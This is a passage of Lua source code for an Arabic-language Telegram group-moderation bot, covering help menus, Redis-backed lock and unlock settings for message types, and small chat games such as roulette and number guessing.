bot.sendText(msg.chat_id,msg.id,"*‹ : اعدادات المجموعه .\n *ٴ━═━═━═━═━═━═━═━ *\n‹ : مسح الرتب .\n‹ : الرابط .\n‹ : مسح الرابط .\n‹ : وضع رابط .\n‹ : تعين الرابط .\n‹ : فحص البوت .\n‹ : الترحيب .\n‹ : مسح الترحيب .\n‹ : وضع ترحيب .\n‹ : تنظيف التعديل .\n‹ : تنظيف الميديا .\n‹ : مسح الميديا .\n‹ : تعين قوانين .\n‹ : مسح القوانين .\n‹ : وضع قوانين .\n‹ :  تعين الايدي .\n‹ : مسح الايدي .\n‹ : تغير الايدي .\n‹ : تغيير اسم المجموعه .\n‹ : تغيير الوصف .\n‹ : رفع الادمنيه .\n‹ : الالعاب الاحترافيه .\n‹ : المجموعه .*","md",true)
elseif text == "م3" or text == "م٣" then    
bot.sendText(msg.chat_id,msg.id,"*‹ : اوامر التفعيل والتعطيل .\n‹ : تفعيل/تعطيل الامر اسفل .\n *ٴ━═━═━═━═━═━═━═━ *\n‹ : اوامر التسليه .\n‹ : الالعاب الاحترافيه .\n‹ : الطرد .\n‹ : الحظر .\n‹ : الرفع .\n‹ : المميزات .\n‹ : المسح التلقائي .\n‹ : ٴall .\n‹ : منو ضافني .\n‹ : تفعيل الردود .\n‹ : الايدي بالصوره .\n‹ : الايدي .\n‹ : التنظيف .\n‹ : الترحيب .\n‹ : الرابط .\n‹ : البايو .\n‹ : صورتي .\n‹ : الالعاب .*","md",true)
elseif text == "م4" or text == "م٤" then    
bot.sendText(msg.chat_id,msg.id,"*‹ : اوامر اخرى .\n *ٴ━═━═━═━═━═━═━═━ *\n‹ : الالعاب الاحترافيه .\n‹ : المجموعه .\n‹ : الرابط .\n‹ : اسمي .\n‹ : ايديي .\n‹ : مسح نقاطي .\n‹ : نقاطي .\n‹ : مسح رسائلي .\n‹ : رسائلي .\n‹ : مسح جهاتي .\n‹ : مسح بالرد .\n‹ : تفاعلي .\n‹ : جهاتي .\n‹ : مسح سحكاتي .\n‹ : سحكاتي .\n‹ : رتبتي .\n‹ : معلوماتي .\n‹ : المنشئ .\n‹ : رفع المنشئ .\n‹ : البايو/نبذتي .\n‹ : التاريخ/الساعه .\n‹ : رابط الحذف .\n‹ : الالعاب .\n‹ : منع بالرد .\n‹ : منع .\n‹ : تنظيف + عدد .\n‹ : قائمه المنع .\n‹ : مسح قائمه المنع .\n‹ : مسح الاوامر المضافه .\n‹ : الاوامر المضافه .\n‹ : ترتيب الاوامر .\n‹ : اضف امر .\n‹ : حذف امر .\n‹ : اضف رد .\n‹ : حذف رد .\n‹ : ردود المدير .\n‹ : مسح الردود المتعدده .\n‹ : الردود المتعدده .\n‹ : وضع عدد المسح +رقم .\n‹ : ٴall .\n‹ : غنيلي،فلم، متحركه، فيديو، رمزيه،انمي،ريمكس،شعر،ميمز،راب .\n‹ : مسح ردود المدير .\n‹ : تغير رد العضو.المميز.الادمن.المدير.المنشئ.المنشئ الاساسي.المالك.المطو  .\n‹ : حذف رد العضو.المميز.الادمن.المدير.المنشئ.المنشئ الاساسي.المالك.المطور .*","md",true)
elseif text == "قفل الكل" or text == "قفل التفليش" or text == "قفل الاباحي" or text == "قفل الكفر" then
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*‹ : تم "..text.." .*").by,"md",true)
list ={"Spam","Edited","Hashtak","via_bot_user_id","messageChatAddMembers","forward_info","Links","Markdaun","WordsFshar","Spam","Tagservr","Username","Keyboard","messagePinMessage","messageSenderChat","Cmd","messageLocation","messageContact","messageVideoNote","messagePoll","messageAudio","messageDocument","messageAnimation","messageSticker","messageVoiceNote","WordsPersian","messagePhoto","messageVideo"}
for i,lock in pairs(list) do
redis:set(bot_id..":"..msg.chat_id..":settings:"..lock,"del")    
end
redis:hset(bot_id.."Spam:Group:User"..msg.chat_id ,"Spam:User","del")  
elseif text == "فتح الكل" or text == "فتح التفليش" or text == "فتح الاباحي" or text == "فتح الكفر" and BasicConstructor(msg) then
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*‹ : تم "..text.." .*").by,"md",true)
list ={"Edited","Hashtak","via_bot_user_id","messageChatAddMembers","forward_info","Links","Markdaun","WordsFshar","Spam","Tagservr","Username","Keyboard","messagePinMessage","messageSenderChat","Cmd","messageLocation","messageContact","messageVideoNote","messageText","message","messagePoll","messageAudio","messageDocument","messageAnimation","AddMempar","messageSticker","messageVoiceNote","WordsPersian","WordsEnglish","JoinByLink","messagePhoto","messageVideo"}
for i,unlock in pairs(list) do 
redis:del(bot_id..":"..msg.chat_id..":settings:"..unlock)    
end
redis:hdel(bot_id.."Spam:Group:User"..msg.chat_id ,"Spam:User")
elseif text == "قفل التكرار" then 
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*‹ : تم قفل "..text.." .*").by,"md",true)
redis:hset(bot_id.."Spam:Group:User"..msg.chat_id ,"Spam:User","del")  
elseif text == "فتح التكرار" then 
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*‹ : تم فتح "..text.." .*").by,"md",true)
redis:hdel(bot_id.."Spam:Group:User"..msg.chat_id ,"Spam:User")  
elseif text == "قفل التكرار بالطرد" then 
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*‹ : تم قفل "..text.." .*").by,"md",true)
redis:hset(bot_id.."Spam:Group:User"..msg.chat_id ,"Spam:User","kick")  
elseif text == "قفل التكرار بالتقييد" then 
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*‹ : تم قفل "..text.." .*").by,"md",true)
redis:hset(bot_id.."Spam:Group:User"..msg.chat_id ,"Spam:User","ked")  
elseif text == "قفل التكرار بالكتم" then 
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*‹ : تم قفل "..text.." .*").by,"md",true)  
redis:hset(bot_id.."Spam:Group:User"..msg.chat_id ,"Spam:User","ktm")  
return false
end  
if text and text:match("^قفل (.*)$") and tonumber(msg.reply_to_message_id) == 0 then
TextMsg = text:match("^قفل (.*)$")
if text:match("^(.*)بالكتم$") then
setTyp = "ktm"
elseif text:match("^(.*)بالتقيد$") or text:match("^(.*)بالتقييد$") then  
setTyp = "ked"
elseif text:match("^(.*)بالطرد$") then 
setTyp = "kick"
else
setTyp = "del"
end
if msg.content.text then 
if TextMsg == 'الصور' or TextMsg == 'الصور بالكتم' or TextMsg == 'الصور بالطرد' or TextMsg == 'الصور بالتقييد' or TextMsg == 'الصور بالتقيد' then
srt = "messagePhoto"
elseif TextMsg == 'الفيديو' or TextMsg == 'الفيديو بالكتم' or TextMsg == 'الفيديو بالطرد' or TextMsg == 'الفيديو بالتقييد' or TextMsg == 'الفيديو بالتقيد' then
srt = "messageVideo"
elseif TextMsg == 'الفارسيه' or TextMsg == 'الفارسيه بالكتم' or TextMsg == 'الفارسيه بالطرد' or TextMsg == 'الفارسيه بالتقييد' or TextMsg == 'الفارسيه بالتقيد' then
srt = "WordsPersian"
elseif TextMsg == 'الانكليزيه' or TextMsg == 'الانكليزيه بالكتم' or TextMsg == 'الانكليزيه بالطرد' or TextMsg == 'الانكليزيه بالتقييد' or TextMsg == 'الانكليزيه بالتقيد' then
srt = "WordsEnglish"
elseif TextMsg == 'الدخول' or TextMsg == 'الدخول بالكتم' or TextMsg == 'الدخول بالطرد' or TextMsg == 'الدخول بالتقييد' or TextMsg == 'الدخول بالتقيد' then
srt = "JoinByLink"
elseif TextMsg == 'الاضافه' or TextMsg == 'الاضافه بالكتم' or TextMsg == 'الاضافه بالطرد' or TextMsg == 'الاضافه بالتقييد' or TextMsg == 'الاضافه بالتقيد' then
srt = "AddMempar"
elseif TextMsg == 'الملصقات' or TextMsg == 'الملصقات بالكتم' or TextMsg == 'الملصقات بالطرد' or TextMsg == 'الملصقات بالتقييد' or TextMsg == 'الملصقات بالتقيد' then
srt = "messageSticker"
elseif TextMsg == 'الاغاني' or TextMsg == 'الاغاني بالكتم' or TextMsg == 'الاغاني بالطرد' or TextMsg == 'الاغاني بالتقييد' or TextMsg == 'الاغاني بالتقيد' then
srt = "messageVoiceNote"
elseif TextMsg == 'الصوت' or TextMsg == 'الصوت بالكتم' or TextMsg == 'الصوت بالطرد' or TextMsg == 'الصوت بالتقييد' or TextMsg == 'الصوت بالتقيد' then
srt = "messageAudio"
elseif TextMsg == 'الملفات' or TextMsg == 'الملفات بالكتم' or TextMsg == 'الملفات بالطرد' or TextMsg == 'الملفات بالتقييد' or TextMsg == 'الملفات بالتقيد' then
srt = "messageDocument"
elseif TextMsg == 'المتحركات' or TextMsg == 'المتحركات بالكتم' or TextMsg == 'المتحركات بالطرد' or TextMsg == 'المتحركات بالتقييد' or TextMsg == 'المتحركات بالتقيد' then
srt = "messageAnimation"
elseif TextMsg == 'الرسائل' or TextMsg == 'الرسائل بالكتم' or TextMsg == 'الرسائل بالطرد' or TextMsg == 'الرسائل بالتقييد' or TextMsg == 'الرسائل بالتقيد' then
srt = "messageText"
elseif TextMsg == 'الدردشه' or TextMsg == 'الدردشه بالكتم' or TextMsg == 'الدردشه بالطرد' or TextMsg == 'الدردشه بالتقييد' or TextMsg == 'الدردشه بالتقيد' then
srt = "message"
elseif TextMsg == 'الاستفتاء' or TextMsg == 'الاستفتاء بالكتم' or TextMsg == 'الاستفتاء بالطرد' or TextMsg == 'الاستفتاء بالتقييد' or TextMsg == 'الاستفتاء بالتقيد' then
srt = "messagePoll"
elseif TextMsg == 'الموقع' or TextMsg == 'الموقع بالكتم' or TextMsg == 'الموقع بالطرد' or TextMsg == 'الموقع بالتقييد' or TextMsg == 'الموقع بالتقيد' then
srt = "messageLocation"
elseif TextMsg == 'الجهات' or TextMsg == 'الجهات بالكتم' or TextMsg == 'الجهات بالطرد' or TextMsg == 'الجهات بالتقييد' or TextMsg == 'الجهات بالتقيد' then
srt = "messageContact"
elseif TextMsg == 'السيلفي' or TextMsg == 'السيلفي بالكتم' or TextMsg == 'السيلفي بالطرد' or TextMsg == 'السيلفي بالتقييد' or TextMsg == 'السيلفي بالتقيد' or TextMsg == 'الفيديو نوت' or TextMsg == 'الفيديو نوت بالكتم' or TextMsg == 'الفيديو نوت بالطرد' or TextMsg == 'الفيديو نوت بالتقييد' or TextMsg == 'الفيديو نوت بالتقيد' then
srt = "messageVideoNote"
elseif TextMsg == 'التثبيت' or TextMsg == 'التثبيت بالكتم' or TextMsg == 'التثبيت بالطرد' or TextMsg == 'التثبيت بالتقييد' or TextMsg == 'التثبيت بالتقيد' then
srt = "messagePinMessage"
elseif TextMsg == 'القناه' or TextMsg == 'القناه بالكتم' or TextMsg == 'القناه بالطرد' or TextMsg == 'القناه بالتقييد' or TextMsg == 'القناه بالتقيد' then
srt = "messageSenderChat"
elseif TextMsg == 'الشارحه' or TextMsg == 'الشارحه بالكتم' or TextMsg == 'الشارحه بالطرد' or TextMsg == 'الشارحه بالتقييد' or TextMsg == 'الشارحه بالتقيد' then
srt = "Cmd"
elseif TextMsg == 'الاشعارات' or TextMsg == 'الاشعارات بالكتم' or TextMsg == 'الاشعارات بالطرد' or TextMsg == 'الاشعارات بالتقييد' or TextMsg == 'الاشعارات بالتقيد' then
srt = "Tagservr"
elseif TextMsg == 'المعرفات' or TextMsg == 'المعرفات بالكتم' or TextMsg == 'المعرفات بالطرد' or TextMsg == 'المعرفات بالتقييد' or TextMsg == 'المعرفات بالتقيد' then
srt = "Username"
elseif TextMsg == 'الكيبورد' or TextMsg == 'الكيبورد بالكتم' or TextMsg == 'الكيبورد بالطرد' or TextMsg == 'الكيبورد بالتقييد' or TextMsg == 'الكيبورد بالتقيد' then
srt = "Keyboard"
elseif TextMsg == 'الماركداون' or TextMsg == 'الماركداون بالكتم' or TextMsg == 'الماركداون بالطرد' or TextMsg == 'الماركداون بالتقييد' or TextMsg == 'الماركداون بالتقيد' then
srt = "Markdaun"
elseif TextMsg == 'الفشار' or TextMsg == 'الفشار بالكتم' or TextMsg == 'الفشار بالطرد' or TextMsg == 'الفشار بالتقييد' or TextMsg == 'الفشار بالتقيد' then
srt = "WordsFshar"
elseif TextMsg == 'الكلايش' or TextMsg == 'الكلايش بالكتم' or TextMsg == 'الكلايش بالطرد' or TextMsg == 'الكلايش بالتقييد' or TextMsg == 'الكلايش بالتقيد' then
srt = "Spam"
elseif TextMsg == 'البوتات' or TextMsg == 'البوتات بالكتم' or TextMsg == 'البوتات بالطرد' or TextMsg == 'البوتات بالتقييد' or TextMsg == 'البوتات بالتقيد' then
srt = "messageChatAddMembers"
elseif TextMsg == 'التوجيه' or TextMsg == 'التوجيه بالكتم' or TextMsg == 'التوجيه بالطرد' or TextMsg == 'التوجيه بالتقييد' or TextMsg == 'التوجيه بالتقيد' then
srt = "forward_info"
elseif TextMsg == 'الروابط' or TextMsg == 'الروابط بالكتم' or TextMsg == 'الروابط بالطرد' or TextMsg == 'الروابط بالتقييد' or TextMsg == 'الروابط بالتقيد' then
srt = "Links"
elseif TextMsg == 'التعديل' or TextMsg == 'التعديل بالكتم' or TextMsg == 'التعديل بالطرد' or TextMsg == 'التعديل بالتقييد' or TextMsg == 'التعديل بالتقيد' or TextMsg == 'تعديل الميديا' or TextMsg == 'تعديل الميديا بالكتم' or TextMsg == 'تعديل الميديا بالطرد' or TextMsg == 'تعديل الميديا بالتقييد' or TextMsg == 'تعديل الميديا بالتقيد' then
srt = "Edited"
elseif TextMsg == 'تاك' or TextMsg == 'تاك بالكتم' or TextMsg == 'تاك بالطرد' or TextMsg == 'تاك بالتقييد' or TextMsg == 'تاك بالتقيد' then
srt = "Hashtak"
elseif TextMsg == 'الانلاين' or TextMsg == 'الانلاين بالكتم' or TextMsg == 'الانلاين بالطرد' or TextMsg == 'الانلاين بالتقييد' or TextMsg == 'الانلاين بالتقيد' then
srt = "via_bot_user_id"
else
return false
end  
if redis:get(bot_id..":"..msg.chat_id..":settings:"..srt) == setTyp then
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*‹ : تم "..text.." سابقا .*").yu,"md",true)  
else
redis:set(bot_id..":"..msg.chat_id..":settings:"..srt,setTyp)
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*‹ : تم "..text.." بنجاح .*").by,"md",true)  
end
end
end
if text and text:match("^فتح (.*)$") and tonumber(msg.reply_to_message_id) == 0 then
local TextMsg = text:match("^فتح (.*)$")
local TextMsg = text:match("^فتح (.*)$")
if msg.content.text then 
if TextMsg == 'الصور' then
srt = "messagePhoto"
elseif TextMsg == 'الفيديو' then
srt = "messageVideo "
elseif TextMsg == 'الفارسيه' or TextMsg == 'الفارسية' or TextMsg == 'الفارسي' then
srt = "WordsPersian"
elseif TextMsg == 'الانكليزيه' or TextMsg == 'الانكليزية' or TextMsg == 'الانكليزي' then
srt = "WordsEnglish"
elseif TextMsg == 'الدخول' then
srt = "JoinByLink"
elseif TextMsg == 'الاضافه' then
srt = "AddMempar"
elseif TextMsg == 'الملصقات' then
srt = "messageSticker"
elseif TextMsg == 'الاغاني' then
srt = "messageVoiceNote"
elseif TextMsg == 'الصوت' then
srt = "messageAudio"
elseif TextMsg == 'الملفات' then
srt = "messageDocument "
elseif TextMsg == 'المتحركات' then
srt = "messageAnimation"
elseif TextMsg == 'الرسائل' then
srt = "messageText"
elseif TextMsg == 'التثبيت' then
srt = "messagePinMessage"
elseif TextMsg == 'الدردشه' then
srt = "message"
elseif TextMsg == 'التوجيه' and BasicConstructor(msg) then
srt = "forward_info"
elseif TextMsg == 'الاستفتاء' then
srt = "messagePoll"
elseif TextMsg == 'الموقع' then
srt = "messageLocation"
elseif TextMsg == 'الجهات' and BasicConstructor(msg) then
srt = "messageContact"
elseif TextMsg == 'السيلفي' or TextMsg == 'الفيديو نوت' then
srt = "messageVideoNote"
elseif TextMsg == 'القناه' and BasicConstructor(msg) then
srt = "messageSenderChat"
elseif TextMsg == 'الشارحه' then
srt = "Cmd"
elseif TextMsg == 'الاشعارات' then
srt = "Tagservr"
elseif TextMsg == 'المعرفات' then
srt = "Username"
elseif TextMsg == 'الكيبورد' then
srt = "Keyboard"
elseif TextMsg == 'الكلايش' then
srt = "Spam"
elseif TextMsg == 'الماركداون' then
srt = "Markdaun"
elseif TextMsg == 'الفشار' then
srt = "WordsFshar"
elseif TextMsg == 'البوتات' and BasicConstructor(msg) then
srt = "messageChatAddMembers"
elseif TextMsg == 'الرابط' or TextMsg == 'الروابط' then
srt = "Links"
elseif TextMsg == 'التعديل' and BasicConstructor(msg) then
srt = "Edited"
elseif TextMsg == 'تاك' or TextMsg == 'هشتاك' then
srt = "Hashtak"
elseif TextMsg == 'الانلاين' or TextMsg == 'الهمسه' or TextMsg == 'انلاين' then
srt = "via_bot_user_id"
else
return false
end  
if not redis:get(bot_id..":"..msg.chat_id..":settings:"..srt) then
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*‹ : تم "..text.." سابقا .*").yu,"md",true)  
else
redis:del(bot_id..":"..msg.chat_id..":settings:"..srt)
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*‹ : تم "..text.." بنجاح .*").by,"md",true)  
end
end
end
end
----------------------------------------------------------------------------------------------------
if text == "اطردني" or text == "طردني" then
if redis:get(bot_id..":"..msg.chat_id..":settings:kickme") then
return bot.sendText(msg.chat_id,msg.id,"*‹ : تم تعطيل اطردني بواسطه المدراء .*","md",true)  
end
bot.sendText(msg.chat_id,msg.id,"*‹ : اضغط نعم لتأكيد الطرد .*","md", true, false, false, false, bot.replyMarkup{
type = 'inline',data = {{{text = '‹ : نعم .',data="Sur_"..msg.sender.user_id.."_1"},{text = '‹ : الغاء .',data="Sur_"..msg.sender.user_id.."_2"}},}})
end
if text == 'الالعاب' or text == 'قائمه الالعاب' or text == 'قائمة الالعاب' then
if not redis:get(bot_id..":"..msg.chat_id..":settings:game") then
t = "*‹ : الالعاب هي .\n ٴ━═━═━═━═━═━═━═━\n‹ : 1 - العكس .\n‹ : 2 - معاني .\n‹ : 3 - حزوره .\n‹ : 4 - الاسرع .\n‹ : 5 - امثله .\n‹ : 6 - المختلف .\n‹ : 7 - سمايلات .\n‹ : 8 - روليت .\n‹ : 9 - تخمين .\n‹ : 10 - احسب .\n‹ : 11 - ترتيب .\n‹ : 12 - منشن .*"
else
t = "*‹ : الالعاب معطله .*"
end
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,t).yu,"md", true)
end
if not Bot(msg) then
if text == 'المشاركين' and redis:get(bot_id..":Witting_StartGame:"..msg.chat_id..msg.sender.user_id) then
local list = redis:smembers(bot_id..':List_Rolet:'..msg.chat_id) 
local Text = '\n  *ٴ━═━═━═━═━═━═━═━ *\n'
if #list == 0 then 
bot.sendText(msg.chat_id,msg.id,"*‹ : لا يوجد لاعبين .*","md",true)
return false
end  
for k, v in pairs(list) do 
Text = Text..k.."-  [" ..v.."] .\n"  
end 
return bot.sendText(msg.chat_id,msg.id,Text,"md",true)  
end
if text == 'نعم' and redis:get(bot_id..":Witting_StartGame:"..msg.chat_id..msg.sender.user_id) then
local list = redis:smembers(bot_id..':List_Rolet:'..msg.chat_id) 
if #list == 1 then 
bot.sendText(msg.chat_id,msg.id,"*‹ : لم يكتمل العدد الكلي للاعبين .*","md",true)  
elseif #list == 0 then 
bot.sendText(msg.chat_id,msg.id,"*‹ : عذرا لم تقوم باضافه اي لاعب .*","md",true)  
return false
end 
local UserName = list[math.random(#list)]
local User_ = UserName:match("^@(.*)$")
local UserId_Info = bot.searchPublicChat(User_)
if (UserId_Info.id) then
redis:incrby(bot_id..":"..msg.chat_id..":"..UserId_Info.id..":game", 3)  
redis:del(bot_id..':List_Rolet:'..msg.chat_id) 
redis:del(bot_id..":Witting_StartGame:"..msg.chat_id..msg.sender.user_id)
bot.sendText(msg.chat_id,msg.id,"*‹ : الف مبروك يا* ["..UserName.."] *لقد فزت\n‹ : تم اضافه 3 نقاط لك\n‹ : للعب مره اخره ارسل ~ (* روليت )","md",true)  
return false
end
end
if text and text:match('^(@[%a%d_]+)$') and redis:get(bot_id..":Number_Add:"..msg.chat_id..msg.sender.user_id) then
if redis:sismember(bot_id..':List_Rolet:'..msg.chat_id,text) then
bot.sendText(msg.chat_id,msg.id,"*‹ : المعرف* ["..text.." ] *موجود سابقا ارسل معرف لم يشارك .*","md",true)  
return false
end 
redis:sadd(bot_id..':List_Rolet:'..msg.chat_id,text)
local CountAdd = redis:get(bot_id..":Number_Add:"..msg.chat_id..msg.sender.user_id)
local CountAll = redis:scard(bot_id..':List_Rolet:'..msg.chat_id)
local CountUser = CountAdd - CountAll
if tonumber(CountAll) == tonumber(CountAdd) then 
redis:del(bot_id..":Number_Add:"..msg.chat_id..msg.sender.user_id) 
redis:setex(bot_id..":Witting_StartGame:"..msg.chat_id..msg.sender.user_id,1400,true)  
bot.sendText(msg.chat_id,msg.id,"*‹ : تم حفظ المعرف (*["..text.."]*)\n‹ : تم اكمال العدد الكلي\n‹ : ارسل (نعم) للبدء .*","md",true)  
return false
end  
bot.sendText(msg.chat_id,msg.id,"*‹ : تم حفظ المعرف* (["..text.."])\n*‹ : تبقى "..CountUser.." لاعبين ليكتمل العدد\n‹ : ارسل المعرف التالي .*","md",true)  
return false
end 
if text and text:match("^(%d+)$") and redis:get(bot_id..":Start_Rolet:"..msg.chat_id..msg.sender.user_id) then
if text == "1" then
bot.sendText(msg.chat_id,msg.id," *‹ : لا استطيع بدء اللعبه بلاعب واحد فقط .*","md",true)
elseif text ~= "1" then
redis:set(bot_id..":Number_Add:"..msg.chat_id..msg.sender.user_id,text)  
redis:del(bot_id..":Start_Rolet:"..msg.chat_id..msg.sender.user_id)  
bot.sendText(msg.chat_id,msg.id,"*‹ : قم  بأرسال معرفات اللاعبين الان .*","md",true)
return false
end
end
if redis:get(bot_id..":"..msg.chat_id..":game:Riddles") then
if text == redis:get(bot_id..":"..msg.chat_id..":game:Riddles") then
redis:incrby(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":game", 1)  
redis:del(bot_id..":"..msg.chat_id..":game:Riddles")
return bot.sendText(msg.chat_id,msg.id,"*‹ : لقد فزت في اللعبه\n‹ : اللعب مره اخره وارسل︙حزوره .*","md",true)  
---else
---redis:del(bot_id..":"..msg.chat_id..":game:Riddles")
end
end
if redis:get(bot_id..":"..msg.chat_id..":game:Meaningof") then
if text == redis:get(bot_id..":"..msg.chat_id..":game:Meaningof") then
redis:incrby(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":game", 1)  
redis:del(bot_id..":"..msg.chat_id..":game:Meaningof")
return bot.sendText(msg.chat_id,msg.id,"*‹ : لقد فزت في اللعبه\n‹ : اللعب مره اخره وارسل︙معاني .*","md",true)  
---else
---redis:del(bot_id..":"..msg.chat_id..":game:Meaningof")
end
end
if redis:get(bot_id..":"..msg.chat_id..":game:Reflection") then
if text == redis:get(bot_id..":"..msg.chat_id..":game:Reflection") then
redis:incrby(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":game", 1)  
redis:del(bot_id..":"..msg.chat_id..":game:Reflection")
return bot.sendText(msg.chat_id,msg.id,"\n*‹ : لقد فزت في اللعبه\n‹ : اللعب مره اخره وارسل︙العكس .*","md",true)  
---else
---redis:del(bot_id..":"..msg.chat_id..":game:Reflection")
end
end
if redis:get(bot_id..":"..msg.chat_id..":game:Smile") then
if text == redis:get(bot_id..":"..msg.chat_id..":game:Smile") then
redis:incrby(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":game", 1)  
redis:del(bot_id..":"..msg.chat_id..":game:Smile")
return bot.sendText(msg.chat_id,msg.id,"*‹ : لقد فزت في اللعبه\n‹ : اللعب مره اخره وارسل︙سمايل او سمايلات .*","md",true)  
---else
---redis:del(bot_id..":"..msg.chat_id..":game:Smile")
end
end 
if redis:get(bot_id..":"..msg.chat_id..":game:Example") then
if text == redis:get(bot_id..":"..msg.chat_id..":game:Example") then 
redis:del(bot_id..":"..msg.chat_id..":game:Example")
redis:incrby(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":game", 1)  
return bot.sendText(msg.chat_id,msg.id,"(‹ : لقد فزت في اللعبه\n‹ : اللعب مره اخره وارسل︙امثله .*","md",true)  
---else
---redis:del(bot_id..":"..msg.chat_id..":game:Example")
end
end
if redis:get(bot_id..":"..msg.chat_id..":game:Monotonous") then
if text == redis:get(bot_id..":"..msg.chat_id..":game:Monotonous") then
redis:del(bot_id..":"..msg.chat_id..":game:Monotonous")
redis:incrby(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":game", 1)  
return bot.sendText(msg.chat_id,msg.id,"*‹ : لقد فزت في اللعبه\n‹ : اللعب مره اخره وارسل︙الاسرع او ترتيب .*","md",true)  
end
end
if redis:get(bot_id..":"..msg.chat_id..":game:Difference") then
if text and text == redis:get(bot_id..":"..msg.chat_id..":game:Difference") then 
redis:del(bot_id..":"..msg.chat_id..":game:Difference")
redis:incrby(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":game", 1)  
return bot.sendText(msg.chat_id,msg.id,"*‹ : لقد فزت في اللعبه\n‹ : اللعب مره اخره وارسل︙المختلف .*","md",true)  
---else
---redis:del(bot_id..":"..msg.chat_id..":game:Difference")
end
end
if redis:get(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":game:Estimate") then  
if text and text:match("^(%d+)$") then
local NUM = text:match("^(%d+)$")
if tonumber(NUM) > 20 then
return bot.sendText(msg.chat_id,msg.id,"*‹ : يجب ان لا يكون الرقم المخمن اكبر من ( 20 )\n‹ :  خمن رقم بين ال ( 1 و 20 ) .*","md",true)  
end 
local GETNUM = redis:get(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":game:Estimate")
if tonumber(NUM) == tonumber(GETNUM) then
redis:del(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":game:SADD")
redis:del(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":game:Estimate")
redis:incrby(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":game",5)  
return bot.sendText(msg.chat_id,msg.id,"*‹ : خمنت الرقم صح\n‹ : تم اضافة ( 5 ) نقاط لك .*","md",true)
elseif tonumber(NUM) ~= tonumber(GETNUM) then
redis:incrby(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":game:SADD",1)
if tonumber(redis:get(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":game:SADD")) >= 3 then
redis:del(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":game:SADD")
redis:del(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":game:Estimate")
return bot.sendText(msg.chat_id,msg.id,"*‹ : خسرت في اللعبه\n‹ : حاول في وقت اخر\n‹ : كان الرقم الذي تم تخمينه ( "..GETNUM.." ) .*","md",true)  
else
return bot.sendText(msg.chat_id,msg.id,"* ‹ : تخمينك من باب الشرجي 😂💓\n ارسل رقم من جديد  .*","md",true)  
end
end
end
end
end
if not redis:get(bot_id..":"..msg.chat_id..":settings:game") then
if text == 'روليت' then
redis:del(bot_id..":Number_Add:"..msg.chat_id..msg.sender.user_id) 
redis:del(bot_id..':List_Rolet:'..msg.chat_id)  
redis:setex(bot_id..":Start_Rolet:"..msg.chat_id..msg.sender.user_id,3600,true)  
bot.sendText(msg.chat_id,msg.id,"*‹ : ارسل عدد اللاعبين للروليت .*","md",true)  
end
if text == "خمن" or text == "تخمين" then   
redis:del(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":game:Estimate")
Num = math.random(1,20)
redis:set(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":game:Estimate",Num)  
return bot.sendText(msg.chat_id,msg.id,"*‹ : اهلا بك عزيزي في لعبة التخمين \n‹ : ملاحظه لديك { 3 } محاولات فقط فكر قبل ارسال تخمينك \n‹ : سيتم تخمين عدد ما بين ال (1 و 20 ) اذا تعتقد انك تستطيع الفوز جرب واللعب الان ؟ .*","md",true)  
end
if text == "المختلف" then
redis:del(bot_id..":"..msg.chat_id..":game:Difference")
mktlf = {"😸","☠","🐼","🐇","🌑","🌚","⭐️","✨","⛈","🌥","⛄️","👨‍🔬","👨‍💻","👨‍🔧","🧚‍♀","??‍♂","🧝‍♂","🙍‍♂","🧖‍♂","👬","🕒","🕤","⌛️","📅",};
name = mktlf[math.random(#mktlf)]
redis:set(bot_id..":"..msg.chat_id..":game:Difference",name)
name = string.gsub(name,"😸","😹??😹😹😹😹😹😹😸😹😹😹??")
name = string.gsub(name,"☠","💀💀💀💀💀💀💀☠💀💀💀💀💀")
name = string.gsub(name,"🐼","👻👻👻🐼👻👻👻👻👻👻👻")
name = string.gsub(name,"🐇","🕊🕊🕊🕊🕊??🕊🕊🕊🕊")
name = string.gsub(name,"🌑","🌚🌚🌚🌚🌚🌑🌚🌚🌚")
name = string.gsub(name,"??","🌑🌑🌑🌑????🌑🌑??")
name = string.gsub(name,"⭐️","🌟🌟🌟🌟🌟??🌟🌟⭐️??🌟🌟")
name = string.gsub(name,"✨","💫💫💫💫💫✨💫💫💫💫")
name = string.gsub(name,"⛈","🌨??🌨🌨🌨⛈🌨🌨🌨🌨")
name = string.gsub(name,"🌥","⛅️⛅️⛅️⛅️⛅️⛅️🌥⛅️⛅️⛅️⛅️")
name = string.gsub(name,"⛄️","☃☃☃☃☃☃⛄️☃☃☃☃")
name = string.gsub(name,"👨‍🔬","👩‍🔬👩‍🔬👩‍🔬👩‍🔬👩‍🔬👩‍🔬👩‍🔬👩‍🔬👨‍🔬👩‍🔬👩‍🔬👩‍🔬")
name = string.gsub(name,"👨‍💻","👩‍💻👩‍??👩‍‍💻👩‍‍??👩‍‍💻👨‍💻??‍💻👩‍💻👩‍💻")
